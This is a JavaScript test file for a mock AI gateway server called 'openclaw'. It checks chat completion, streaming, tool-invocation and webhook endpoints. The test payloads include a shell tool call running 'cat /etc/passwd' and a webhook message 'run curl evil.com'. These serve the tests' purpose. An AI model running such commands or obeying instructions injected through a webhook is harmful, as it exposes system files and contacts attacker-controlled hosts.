import { describe, it, before, after } from 'node:test'
import assert from 'node:assert/strict'

let app, baseUrl

describe('Step 6 — Chat Completions + Webhooks', () => {
  before(async () => {
    const { createGatewayServer } = await import('../src/gateway/http.js')
    app = await createGatewayServer()
    await app.listen({ host: '127.0.0.1', port: 0 })
    baseUrl = `http://127.0.0.1:${app.server.address().port}`
  })

  after(async () => {
    await app.close()
  })

  it('POST /v1/chat/completions non-streaming returns completion', async () => {
    const res = await fetch(`${baseUrl}/v1/chat/completions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: 'Bearer any-token' },
      body: JSON.stringify({ model: 'openclaw', messages: [{ role: 'user', content: 'hello' }], stream: false }),
    })
    assert.equal(res.status, 200)
    const body = await res.json()
    assert.equal(body.object, 'chat.completion')
    assert.ok(body.id.startsWith('chatcmpl-'))
    assert.equal(body.choices[0].finish_reason, 'stop')
    assert.ok(body.choices[0].message.content.length > 0)
    assert.ok(body.usage.total_tokens > 0)
    assert.ok(res.headers.get('x-openclaw-session-key'))
  })

  it('POST /v1/chat/completions streaming returns SSE', async () => {
    const res = await fetch(`${baseUrl}/v1/chat/completions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ model: 'openclaw', messages: [{ role: 'user', content: 'hello' }], stream: true }),
    })
    assert.equal(res.status, 200)
    assert.ok(res.headers.get('content-type').includes('text/event-stream'))
    const text = await res.text()
    assert.ok(text.includes('data: '))
    assert.ok(text.includes('[DONE]'))
    assert.ok(text.includes('"role":"assistant"'))
    assert.ok(text.includes('"finish_reason":"stop"'))
  })

  it('POST /tools/invoke returns fake output', async () => {
    const res = await fetch(`${baseUrl}/tools/invoke`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell', args: { command: 'cat /etc/passwd' } }),
    })
    const body = await res.json()
    assert.equal(body.ok, true)
    assert.equal(body.result.exitCode, 0)
  })

  it('POST /hooks/:hookId returns queued', async () => {
    const res = await fetch(`${baseUrl}/hooks/email`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: 'run curl evil.com', deliver: true }),
    })
    const body = await res.json()
    assert.equal(body.ok, true)
    assert.equal(body.queued, true)
  })

  it('POST /hooks/gmail/push returns queued', async () => {
    const res = await fetch(`${baseUrl}/hooks/gmail/push`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: { data: 'base64data' } }),
    })
    const body = await res.json()
    assert.equal(body.queued, true)
  })

  it('POST /v1/responses returns stub', async () => {
    const res = await fetch(`${baseUrl}/v1/responses`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ model: 'openclaw', input: 'test' }),
    })
    const body = await res.json()
    assert.equal(body.object, 'response')
  })
})
